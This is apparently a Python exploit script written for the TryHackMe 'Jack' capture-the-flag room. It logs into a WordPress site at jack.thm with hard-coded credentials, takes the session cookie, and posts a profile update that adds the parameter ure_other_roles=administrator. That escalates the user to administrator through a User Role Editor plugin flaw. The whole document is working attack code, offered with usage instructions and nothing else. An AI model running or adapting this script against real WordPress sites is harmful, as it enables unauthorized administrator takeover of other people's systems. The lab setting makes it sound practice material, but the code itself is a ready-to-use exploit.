#!/usr/bin/env python
#Jack (TryHackMe) website administrator access script
#program outline:
	# - POST request with compromised credentials
	# - Format the cookie applicable to wp-admin.php
	# - Copy the request body from the request and add ure_other_roles=administrator
	# - POST request with compromised parameter and cookie
#usage: 
	# - python jackLocalPriv.py
	# - refresh Wordpress dashboard, should have admin role now
import sys, requests

url = "http://jack.thm/wp-login.php"
creds = {'log' : 'wendy', 'pwd' : 'changelater', 'testcookie' : '1'}

r = requests.post(url, data=creds)

cookies = r.headers['Set-Cookie'].split('wp-admin')[1].split('=')[1].split(';')[0].strip()

url1 = "http://jack.thm/wp-admin/profile.php"
data = {"_wpnonce":"033b0aea07",
		 "_wp_http_referer":"/wp-admin/profile.php",
		 "from":"profile",
		 "checkuser_id":"2",
		 "color-nonce":"bc074329d7",
		 "admin_color":"fresh",
		 "admin_bar_front":"1",
		 "first_name":"",
		 "last_name":"", 
		 "nickname":"wendy",
		 "display_name":"wendy",
		 "email":"wendy@tryhackme.com",
		 "url":"",
		 "description":"",
		 "pass1":"",
		 "pass2":"",
		 "action":"update",
		 "user_id":"2",
		 "ure_other_roles":"administrator",
		 "submit":"Update+Profile",
}

req = requests.post(url1, data=data, cookies={"wordpress_07f87507b491ce41808428c8c499655c":cookies})
print(req.status_code)
